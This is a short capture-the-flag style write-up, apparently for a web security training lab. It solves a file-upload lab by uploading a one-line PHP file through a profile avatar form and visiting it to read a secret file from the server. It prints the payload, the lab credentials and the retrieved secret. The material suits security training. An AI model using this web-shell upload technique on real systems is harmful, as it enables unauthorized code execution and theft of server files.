# File upload vulnerabilities


---

<details>
  <summary>Lab: Remote code execution via web shell upload</summary>

> ###  To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file ``/home/carlos/secret``. Submit this secret using the button provided in the lab banner.

> You can log in to your own account using the following credentials: ``wiener:peter``


---

1. login as ``wiener``
2. make newfile ``exploit.php``

``content`` of it:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

3. on my profile try to upload this file instead of photo

<img width="1140" height="282" alt="image" src="https://github.com/user-attachments/assets/27a7e7ba-24e8-44f4-9cfa-f8f0237436a9" />

<img width="1541" height="690" alt="image" src="https://github.com/user-attachments/assets/d63874c1-6f17-4726-8cf3-2c43c93797cb" />

4. it successfully uploaded
5. now want to run this file we know form the request it saved in ``/files/avatars/exploit.php``

```url
https://0a6300e9038f3f07800e218600ea00a0.web-security-academy.net/files/avatars/exploit.php
```
```
mPcV5fg8QF3QG5vvRAjs2BIz4bVAcRra
```

<img width="1541" height="690" alt="image" src="https://github.com/user-attachments/assets/634cd97e-e1b8-4194-816f-b98dd585f83c" />

  
</details>

